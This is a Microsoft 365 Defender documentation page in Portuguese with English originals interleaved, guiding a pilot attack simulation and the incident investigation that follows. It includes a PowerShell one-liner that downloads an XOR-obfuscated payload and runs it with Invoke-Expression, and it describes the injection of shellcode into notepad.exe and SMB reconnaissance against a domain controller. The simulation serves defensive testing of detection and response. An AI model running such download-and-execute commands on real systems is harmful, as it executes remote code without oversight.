---
title: Executar as simulações de ataque do Microsoft 365 defender
description: Execute as simulações de ataque para seu projeto piloto do Microsoft 365 defender para ver como elas se desdobram e foram rapidamente corrigidas.
keywords: Simulação de ataque piloto de proteção de ameaças da Microsoft, execução da simulação de ataque piloto do Microsoft Threat Protection, simular ataque no Microsoft Threat Protection, projeto piloto de proteção contra ameaças da Microsoft, segurança da CyberSource, ameaça persistente avançada, segurança corporativa, dispositivos, dispositivo, identidade, usuários, dados, aplicativos, incidentes, investigação e correção automatizadas, busca avançada
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.openlocfilehash: fac3a79f1522e5e7777b2b54bce2b8bd695f8d7a
ms.sourcegitcommit: ce46d1bd67091d4ed0e2b776dfed55e2d88cdbf4
ms.translationtype: MT
ms.contentlocale: pt-BR
ms.lasthandoff: 11/18/2020
ms.locfileid: "49131340"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a><span data-ttu-id="732ab-104">Executar as simulações de ataque do Microsoft 365 defender</span><span class="sxs-lookup"><span data-stu-id="732ab-104">Run your Microsoft 365 Defender attack simulations</span></span>  

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|<span data-ttu-id="732ab-105">[![Planejamento](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)</span><span class="sxs-lookup"><span data-stu-id="732ab-105">[![Planning](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)</span></span><br/>[<span data-ttu-id="732ab-106">Planejamento</span><span class="sxs-lookup"><span data-stu-id="732ab-106">Planning</span></span>](mtp-pilot-plan.md) |<span data-ttu-id="732ab-107">[![Preparar](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)</span><span class="sxs-lookup"><span data-stu-id="732ab-107">[![Prepare](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)</span></span><br/>[<span data-ttu-id="732ab-108">Preparação</span><span class="sxs-lookup"><span data-stu-id="732ab-108">Preparation</span></span>](prepare-mtpeval.md) | ![Simular ameaças](../../media/phase-diagrams/3-simluate.png)<br/><span data-ttu-id="732ab-110">Simular ameaças</span><span class="sxs-lookup"><span data-stu-id="732ab-110">Simulate attack</span></span>| <span data-ttu-id="732ab-111">[![Fechar e resumir](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)</span><span class="sxs-lookup"><span data-stu-id="732ab-111">[![Close and summarize](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)</span></span><br/>[<span data-ttu-id="732ab-112">Fechar e resumir</span><span class="sxs-lookup"><span data-stu-id="732ab-112">Close and summarize</span></span>](mtp-pilot-close.md)|
|--|--|--|--|
|| |<span data-ttu-id="732ab-113">*Você está aqui!*</span><span class="sxs-lookup"><span data-stu-id="732ab-113">*You are here!*</span></span> | |

<span data-ttu-id="732ab-114">Você está atualmente na fase de simulação de ataque.</span><span class="sxs-lookup"><span data-stu-id="732ab-114">You're currently in the attack simulation phase.</span></span>

<span data-ttu-id="732ab-115">Após preparar seu ambiente piloto, é hora de testar o gerenciamento de incidentes do Microsoft 365 defender e os recursos de investigação e correção automatizados.</span><span class="sxs-lookup"><span data-stu-id="732ab-115">After preparing your pilot environment, it’s time to test the Microsoft 365 Defender incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="732ab-116">Ajudaremos você a simular um ataque sofisticado que aproveita as técnicas avançadas para ocultar da detecção.</span><span class="sxs-lookup"><span data-stu-id="732ab-116">We'll help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="732ab-117">O ataque enumera as sessões de SMB (bloco de mensagens de servidor) abertas em controladores de domínio e recupera endereços IP recentes de dispositivos de usuários.</span><span class="sxs-lookup"><span data-stu-id="732ab-117">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users’ devices.</span></span> <span data-ttu-id="732ab-118">Essa categoria de ataques geralmente não inclui arquivos descartados no dispositivo da vítima: eles ocorrem exclusivamente na memória.</span><span class="sxs-lookup"><span data-stu-id="732ab-118">This category of attacks usually doesn’t include files dropped on the victim’s device—they occur solely in memory.</span></span> <span data-ttu-id="732ab-119">Eles "vivem do terreno" usando as ferramentas de sistema e administrativas existentes e injetam seu código em processos do sistema para ocultar sua execução, tal comportamento permite que eles causem a detecção e persistam no dispositivo.</span><span class="sxs-lookup"><span data-stu-id="732ab-119">They “live off the land” by using existing system and administrative tools and inject their code into system processes to hide their execution, Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="732ab-120">Nesta simulação, nosso cenário de exemplo começa com um script do PowerShell.</span><span class="sxs-lookup"><span data-stu-id="732ab-120">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="732ab-121">Um usuário pode ser levado para executar um script.</span><span class="sxs-lookup"><span data-stu-id="732ab-121">A user might be tricked into running a script.</span></span> <span data-ttu-id="732ab-122">Ou o script pode ser executado a partir de uma conexão remota para outro computador a partir de um dispositivo previamente infectado, o invasor que está tentando se mover mais tarde na rede.</span><span class="sxs-lookup"><span data-stu-id="732ab-122">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="732ab-123">A detecção desses scripts pode ser difícil porque os administradores também costumam executar scripts remotamente para realizar várias atividades administrativas.</span><span class="sxs-lookup"><span data-stu-id="732ab-123">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Ataque sem arquivo do PowerShell com injeção de processo e diagrama de ataque do Reconnaisance SMB](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="732ab-125">Durante a simulação, o ataque injeta shellcode em um processo aparentemente inocente.</span><span class="sxs-lookup"><span data-stu-id="732ab-125">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="732ab-126">O cenário requer o uso de notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="732ab-126">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="732ab-127">Escolhemos esse processo para a simulação, mas os invasores provavelmente direcionariam um processo de sistema de longa execução, como svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="732ab-127">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="732ab-128">O shellcode prossegue para entrar em contato com o servidor de comando e controle (C2) do invasor para receber instruções sobre como proceder.</span><span class="sxs-lookup"><span data-stu-id="732ab-128">The shellcode then goes on to contact the attacker’s command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="732ab-129">O script tenta executar consultas de reconhecimento no controlador de domínio (DC).</span><span class="sxs-lookup"><span data-stu-id="732ab-129">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="732ab-130">O reconhecimento permite que um invasor Obtenha informações sobre as informações recentes de login do usuário.</span><span class="sxs-lookup"><span data-stu-id="732ab-130">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="732ab-131">Após os invasores terem essa informação, eles podem ser movidos para a rede de forma mais tarde para obter uma conta confidencial específica</span><span class="sxs-lookup"><span data-stu-id="732ab-131">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

>[!IMPORTANT]
><span data-ttu-id="732ab-132">Para obter resultados ideais, siga as instruções de simulação de ataque o mais próximo possível.</span><span class="sxs-lookup"><span data-stu-id="732ab-132">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>


## <a name="simulation-environment-requirements"></a><span data-ttu-id="732ab-133">Requisitos do ambiente de simulação</span><span class="sxs-lookup"><span data-stu-id="732ab-133">Simulation environment requirements</span></span>

<span data-ttu-id="732ab-134">Como você já configurou o ambiente piloto durante a fase de preparação, verifique se você tem dois dispositivos para este cenário: um dispositivo de teste e um controlador de domínio.</span><span class="sxs-lookup"><span data-stu-id="732ab-134">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1.  <span data-ttu-id="732ab-135">Verifique se o seu locatário [ativou o Microsoft 365 defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span><span class="sxs-lookup"><span data-stu-id="732ab-135">Verify your tenant has [enabled Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>

2.  <span data-ttu-id="732ab-136">Verifique a configuração do controlador de domínio de teste:</span><span class="sxs-lookup"><span data-stu-id="732ab-136">Verify your test domain controller configuration:</span></span>

    - <span data-ttu-id="732ab-137">O dispositivo é executado com o Windows Server 2008 R2 ou uma versão posterior.</span><span class="sxs-lookup"><span data-stu-id="732ab-137">Device runs with Windows Server 2008 R2 or a later version.</span></span>
    - <span data-ttu-id="732ab-138">O controlador de domínio de teste para o [Microsoft defender para identidade](https://docs.microsoft.com/azure/security-center/security-center-wdatp) e habilitar o [gerenciamento remoto](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span><span class="sxs-lookup"><span data-stu-id="732ab-138">The test domain controller to [Microsoft Defender for Identity](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>    
    - <span data-ttu-id="732ab-139">Verifique se a [integração do Microsoft defender for Identity e do Microsoft Cloud app Security](https://docs.microsoft.com/cloud-app-security/aatp-integration) foi habilitada.</span><span class="sxs-lookup"><span data-stu-id="732ab-139">Verify that [Microsoft Defender for Identity and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) have been enabled.</span></span>
    - <span data-ttu-id="732ab-140">Um usuário de teste é criado em seu domínio – nenhuma permissão de administrador é necessária.</span><span class="sxs-lookup"><span data-stu-id="732ab-140">A test user is created on your domain – no admin permissions needed.</span></span>

3.  <span data-ttu-id="732ab-141">Verifique a configuração do dispositivo de teste:</span><span class="sxs-lookup"><span data-stu-id="732ab-141">Verify test device configuration:</span></span>
 
    1.  <span data-ttu-id="732ab-142">O dispositivo é executado com o Windows 10 versão 1903 ou uma versão posterior.</span><span class="sxs-lookup"><span data-stu-id="732ab-142">Device runs with Windows 10 version 1903 or a later version.</span></span>
    
    1.  <span data-ttu-id="732ab-143">O dispositivo de teste faz parte do domínio de teste.</span><span class="sxs-lookup"><span data-stu-id="732ab-143">Test device is joined to the test domain.</span></span>
    
    1.  <span data-ttu-id="732ab-144">[Ative o Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span><span class="sxs-lookup"><span data-stu-id="732ab-144">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="732ab-145">Se você estiver tendo problemas para habilitar o Windows Defender Antivirus, consulte este [tópico de solução de problemas](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="732ab-145">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    
    1.  <span data-ttu-id="732ab-146">Verifique se o dispositivo de teste está [integrado ao Microsoft defender para ponto de extremidade](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="732ab-146">Verify that the test device is [onboarded to Microsoft Defender for Endpoint)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="732ab-147">Se você usar um locatário existente e implementar grupos de dispositivos, crie um grupo de dispositivos dedicado para o dispositivo de teste e empurre-o para o nível superior na configuração UX.</span><span class="sxs-lookup"><span data-stu-id="732ab-147">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>


## <a name="run-the-simulation"></a><span data-ttu-id="732ab-148">Executar a simulação</span><span class="sxs-lookup"><span data-stu-id="732ab-148">Run the simulation</span></span>

<span data-ttu-id="732ab-149">Para executar a simulação do cenário de ataque:</span><span class="sxs-lookup"><span data-stu-id="732ab-149">To run the attack scenario simulation:</span></span>

1.  <span data-ttu-id="732ab-150">Faça logon no dispositivo de teste com a conta de usuário de teste.</span><span class="sxs-lookup"><span data-stu-id="732ab-150">Log in to the test device with the test user account.</span></span>

2.  <span data-ttu-id="732ab-151">Abra uma janela do Windows PowerShell no dispositivo de teste.</span><span class="sxs-lookup"><span data-stu-id="732ab-151">Open a Windows PowerShell window on the test device.</span></span>

3.  <span data-ttu-id="732ab-152">Copie o seguinte script de simulação:</span><span class="sxs-lookup"><span data-stu-id="732ab-152">Copy the following simulation script:</span></span>

    ```powershell
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
    -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
    ```
    
    > [!NOTE]
    > <span data-ttu-id="732ab-153">Se você abrir este documento em um navegador da Web, poderá ter problemas ao copiar o texto completo sem perder determinados caracteres ou introduzir quebras de linha extras.</span><span class="sxs-lookup"><span data-stu-id="732ab-153">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="732ab-154">Baixe este documento e abra-o no Adobe Reader.</span><span class="sxs-lookup"><span data-stu-id="732ab-154">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="732ab-155">No prompt, Cole e execute o script copiado.</span><span class="sxs-lookup"><span data-stu-id="732ab-155">At the prompt, paste and run the copied script.</span></span>

>[!NOTE]
><span data-ttu-id="732ab-156">Se você estiver executando o PowerShell usando o protocolo RDP, use o comando digitar texto da área de transferência no cliente RDP porque a tecla de atalho **Ctrl-V** ou o método clique com o botão direito do mouse-colar pode não funcionar.</span><span class="sxs-lookup"><span data-stu-id="732ab-156">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span>  <span data-ttu-id="732ab-157">As versões recentes do PowerShell às vezes também não aceitarão esse método, você pode precisar copiar para o bloco de notas na memória primeiro, copiá-lo na máquina virtual e colá-lo no PowerShell.</span><span class="sxs-lookup"><span data-stu-id="732ab-157">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="732ab-158">Alguns segundos mais tarde, o <i>notepad.exe</i> será aberto.</span><span class="sxs-lookup"><span data-stu-id="732ab-158">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="732ab-159">Um código de ataque simulado será injetado em notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="732ab-159">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="732ab-160">Mantenha a instância gerada automaticamente do bloco de notas aberta para experimentar o cenário completo.</span><span class="sxs-lookup"><span data-stu-id="732ab-160">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="732ab-161">O código de ataque simulado tentará se comunicar com um endereço IP externo (simulando o servidor C2) e tentará o reconhecimento em relação ao controlador de domínio por meio de SMB.</span><span class="sxs-lookup"><span data-stu-id="732ab-161">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="732ab-162">Você verá uma mensagem exibida no console do PowerShell quando esse script for concluído.</span><span class="sxs-lookup"><span data-stu-id="732ab-162">You'll see a message displayed on the PowerShell console when this script completes.</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0      
```

<span data-ttu-id="732ab-163">Para ver o recurso automatizado de incidentes e respostas em ação, mantenha o processo de notepad.exe aberto.</span><span class="sxs-lookup"><span data-stu-id="732ab-163">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="732ab-164">Você verá o incidente e a resposta automáticos interrompe o processo do bloco de notas.</span><span class="sxs-lookup"><span data-stu-id="732ab-164">You'll see Automated Incident and Response stop the Notepad process.</span></span>


## <a name="investigate-an-incident"></a><span data-ttu-id="732ab-165">Investigar um incidente</span><span class="sxs-lookup"><span data-stu-id="732ab-165">Investigate an incident</span></span>

>[!NOTE]
><span data-ttu-id="732ab-166">Antes de orientá-lo nesta simulação, Assista ao vídeo a seguir para ver como o gerenciamento de incidentes ajuda você a juntar os alertas relacionados, como parte do processo de investigação, onde você pode encontrá-los no portal e como ele pode ajudá-lo em suas operações de segurança:</span><span class="sxs-lookup"><span data-stu-id="732ab-166">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="732ab-167">Mudando para o ponto de vista do analista do SOC, agora você pode começar a investigar o ataque no portal da central de segurança do Microsoft 365.</span><span class="sxs-lookup"><span data-stu-id="732ab-167">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span> 

1.  <span data-ttu-id="732ab-168">Abra a fila de incidentes do [portal da central de segurança do Microsoft 365](https://security.microsoft.com/incidents) de qualquer dispositivo.</span><span class="sxs-lookup"><span data-stu-id="732ab-168">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2.  <span data-ttu-id="732ab-169">Navegue até **incidentes** no menu.</span><span class="sxs-lookup"><span data-stu-id="732ab-169">Navigate to **Incidents** from the menu.</span></span> 

    ![Captura de tela de incidentes, conforme mostrado no menu esquerdo do centro de segurança do Microsoft 365](../../media/mtp/fig1.png)

3.  <span data-ttu-id="732ab-171">O novo incidente para o ataque simulado será exibido na fila de incidentes.</span><span class="sxs-lookup"><span data-stu-id="732ab-171">The new incident for the simulated attack will appear in the incident queue.</span></span>
 
    ![Captura de tela da fila de incidentes](../../media/mtp/fig2.png)


### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="732ab-173">Investigue o ataque como um único incidente</span><span class="sxs-lookup"><span data-stu-id="732ab-173">Investigate the attack as a single incident</span></span>

<span data-ttu-id="732ab-174">O Microsoft 365 defender correlaciona a análise e agrega todos os alertas e investigações relacionados de produtos diferentes em uma entidade de incidente.</span><span class="sxs-lookup"><span data-stu-id="732ab-174">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="732ab-175">Fazendo isso, o Microsoft 365 defender mostra uma história de ataque mais ampla, permitindo que o analista do SOC entenda e responda a ameaças complexas.</span><span class="sxs-lookup"><span data-stu-id="732ab-175">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="732ab-176">Os alertas gerados durante essa simulação estão associados à mesma ameaça e, como resultado, são automaticamente agregados como um único incidente.</span><span class="sxs-lookup"><span data-stu-id="732ab-176">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="732ab-177">Para exibir o incidente:</span><span class="sxs-lookup"><span data-stu-id="732ab-177">To view the incident:</span></span>

1.  <span data-ttu-id="732ab-178">Navegue até a fila de **incidentes** .</span><span class="sxs-lookup"><span data-stu-id="732ab-178">Navigate to the **Incidents** queue.</span></span>
 
    ![Captura de tela de incidentes no menu de navegação](../../media/mtp/fig1.png)

2.  <span data-ttu-id="732ab-180">Selecione o item mais recente clicando no círculo localizado à esquerda do nome do incidente.</span><span class="sxs-lookup"><span data-stu-id="732ab-180">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="732ab-181">Um painel lateral exibe informações adicionais sobre o incidente, incluindo todos os alertas relacionados.</span><span class="sxs-lookup"><span data-stu-id="732ab-181">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="732ab-182">Cada incidente tem um nome exclusivo que o descreve com base nos atributos dos alertas que inclui.</span><span class="sxs-lookup"><span data-stu-id="732ab-182">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

    ![Captura de tela da página incidentes onde os alertas gerados são agregados durante a simulação](../../media/mtp/fig4.png)

    <span data-ttu-id="732ab-184">Os alertas que aparecem no painel podem ser filtrados com base nos recursos de serviço: Microsoft defender para identidade, Microsoft Cloud app Security, Microsoft defender para ponto de extremidade, Microsoft 365 defender e Microsoft defender para Office 365.</span><span class="sxs-lookup"><span data-stu-id="732ab-184">The alerts that show in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>  

3.  <span data-ttu-id="732ab-185">Selecione **abrir página de incidente** para obter mais informações sobre o incidente.</span><span class="sxs-lookup"><span data-stu-id="732ab-185">Select **Open incident page** to get more information about the incident.</span></span>

    <span data-ttu-id="732ab-186">Na página **incidente** , você pode ver todos os alertas e informações relacionadas ao incidente.</span><span class="sxs-lookup"><span data-stu-id="732ab-186">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="732ab-187">As informações incluem as entidades e os ativos envolvidos no alerta, a fonte de detecção dos alertas (Microsoft defender para identidade, EDR) e o motivo pelo qual foram vinculados.</span><span class="sxs-lookup"><span data-stu-id="732ab-187">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (Microsoft Defender for Identity, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="732ab-188">A revisão da lista de alertas de incidentes mostra a progressão do ataque.</span><span class="sxs-lookup"><span data-stu-id="732ab-188">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="732ab-189">Nesse modo de exibição, você pode ver e investigar os alertas individuais.</span><span class="sxs-lookup"><span data-stu-id="732ab-189">From this view, you can see and investigate the individual alerts.</span></span>

    <span data-ttu-id="732ab-190">Você também pode clicar em **gerenciar incidente** no menu direito, marcar o incidente, atribuí-lo a si mesmo e adicionar comentários.</span><span class="sxs-lookup"><span data-stu-id="732ab-190">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

    ![Captura de tela de onde clicar em gerenciar incidente](../../media/mtp/fig5a.png)

    ![<span data-ttu-id="732ab-192">Captura de tela dos campos no painel gerenciar incidente onde você pode marcar o incidente, atribuí-lo a si mesmo e adicionar comentários</span><span class="sxs-lookup"><span data-stu-id="732ab-192">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)


### <a name="review-generated-alerts"></a><span data-ttu-id="732ab-193">Examinar alertas gerados</span><span class="sxs-lookup"><span data-stu-id="732ab-193">Review generated alerts</span></span> 

<span data-ttu-id="732ab-194">Vamos examinar alguns dos alertas gerados durante o ataque simulado.</span><span class="sxs-lookup"><span data-stu-id="732ab-194">Let’s look at some of the alerts generated during the simulated attack.</span></span>

>[!NOTE]
><span data-ttu-id="732ab-195">Vamos examinar apenas alguns alertas gerados durante o ataque simulado.</span><span class="sxs-lookup"><span data-stu-id="732ab-195">We’ll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="732ab-196">Dependendo da versão do Windows e dos produtos do Microsoft 365 defender em execução no seu dispositivo de teste, você poderá ver mais alertas que aparecem em uma ordem um pouco diferente.</span><span class="sxs-lookup"><span data-stu-id="732ab-196">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![Captura de tela dos alertas gerados](../../media/mtp/fig6.png) 


<span data-ttu-id="732ab-198">**Alerta: injeção de processo suspeito observada (origem: Microsoft defender para ponto de extremidade EDR)**</span><span class="sxs-lookup"><span data-stu-id="732ab-198">**Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint EDR)**</span></span>

<span data-ttu-id="732ab-199">Os invasores avançados usam métodos sofisticados e furtivos para persistir na memória e ocultar as ferramentas de detecção.</span><span class="sxs-lookup"><span data-stu-id="732ab-199">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="732ab-200">Uma técnica comum é operar de dentro de um processo de sistema confiável, em vez de um executável mal-intencionado, dificultando as ferramentas de detecção e as operações de segurança para identificar o código mal-intencionado.</span><span class="sxs-lookup"><span data-stu-id="732ab-200">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="732ab-201">Para permitir que os analistas do SOC confiram esses ataques avançados, os sensores de memória profundas no Microsoft defender para o ponto de extremidade fornecem uma visibilidade sem precedentes em uma variedade de técnicas de injeção de código de processo cruzado.</span><span class="sxs-lookup"><span data-stu-id="732ab-201">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="732ab-202">A figura a seguir mostra como o defender para ponto de extremidade foi detectado e alertado na tentativa de injetar código para <i>notepad.exe</i>.</span><span class="sxs-lookup"><span data-stu-id="732ab-202">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![Captura de tela do alerta de injeção de código potencialmente mal-intencionado](../../media/mtp/fig7.png) 


<span data-ttu-id="732ab-204">**Alerta: comportamento inesperado observado por um processo executado sem argumentos de linha de comando (origem: Microsoft defender para ponto de extremidade EDR)**</span><span class="sxs-lookup"><span data-stu-id="732ab-204">**Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint EDR)**</span></span>

<span data-ttu-id="732ab-205">As detecções do Microsoft defender for Endpoint geralmente direcionam o atributo mais comum de uma técnica de ataque.</span><span class="sxs-lookup"><span data-stu-id="732ab-205">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="732ab-206">Esse método garante a durabilidade e eleva a barra para que os atacantes alternem para táticas mais recentes.</span><span class="sxs-lookup"><span data-stu-id="732ab-206">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="732ab-207">Empregamos algoritmos de aprendizado em larga escala para estabelecer o comportamento normal de processos comuns dentro de uma organização e em todo o mundo e observar quando esses processos mostram comportamentos anormais.</span><span class="sxs-lookup"><span data-stu-id="732ab-207">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="732ab-208">Esses comportamentos anormais geralmente indicam que códigos estranhos foram introduzidos e estão sendo executados em um processo de outra confiança.</span><span class="sxs-lookup"><span data-stu-id="732ab-208">These anomalous behaviors often indicate that extraneous code was introduced and are running in an otherwise trusted process.</span></span>

<span data-ttu-id="732ab-209">Para esse cenário, o <i>notepad.exe</i> de processo está exibindo um comportamento anormal, envolvendo a comunicação com um local externo.</span><span class="sxs-lookup"><span data-stu-id="732ab-209">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="732ab-210">Esse resultado é independente do método específico usado para introduzir e executar o código mal-intencionado.</span><span class="sxs-lookup"><span data-stu-id="732ab-210">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

>[!NOTE]
><span data-ttu-id="732ab-211">Como esse alerta se baseia nos modelos de aprendizado de máquina que exigem processamento de backend adicional, pode levar algum tempo antes de ver esse alerta no Portal.</span><span class="sxs-lookup"><span data-stu-id="732ab-211">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="732ab-212">Observe que os detalhes do alerta incluem o endereço IP externo, um indicador que você pode usar como uma tabela dinâmica para expandir a investigação.</span><span class="sxs-lookup"><span data-stu-id="732ab-212">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="732ab-213">Selecione o endereço IP na árvore processo de alerta para exibir a página detalhes do endereço IP.</span><span class="sxs-lookup"><span data-stu-id="732ab-213">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![Captura de tela do alerta para comportamento inesperado por um processo executado sem argumentos de linha de comando](../../media/mtp/fig8.png) 

<span data-ttu-id="732ab-215">A figura a seguir exibe a página de detalhes do endereço IP selecionado (clicando em endereço IP na árvore de processo de alerta).</span><span class="sxs-lookup"><span data-stu-id="732ab-215">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
<span data-ttu-id="732ab-216">![Captura de tela da página detalhes do endereço IP](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="732ab-216">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>


